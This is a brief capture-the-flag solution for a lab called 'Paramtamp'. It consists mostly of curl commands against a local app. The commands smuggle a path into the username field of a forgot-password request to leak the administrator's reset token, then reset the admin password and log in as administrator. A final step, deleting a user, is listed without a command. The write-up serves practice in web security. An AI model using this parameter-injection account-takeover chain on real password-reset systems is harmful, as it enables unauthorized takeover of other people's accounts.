# Paramtamp
# Author: [Nishant](https://github.com/freyxfi)

# Solution
 
- Leak Admin’s Reset Token (via SSRP)

```
curl -s -X POST http://localhost:4000/forgot-password ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"administrator/field/passwordResetToken\"}"
```

- Reset Admin Password

```
curl -s -X POST "http://localhost:4000/reset-password?passwordResetToken=tok-abc123xyz" ^
  -H "Content-Type: application/json" ^
  -d "{\"password\":\"MyN3wP@ss\",\"confirm\":\"MyN3wP@ss\"}"
```

- Log in as Administrator

 ```
  curl -s -X POST http://localhost:4000/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"administrator\",\"password\":\"MyN3wP@ss\"}"
```

- Delete John the flag user 
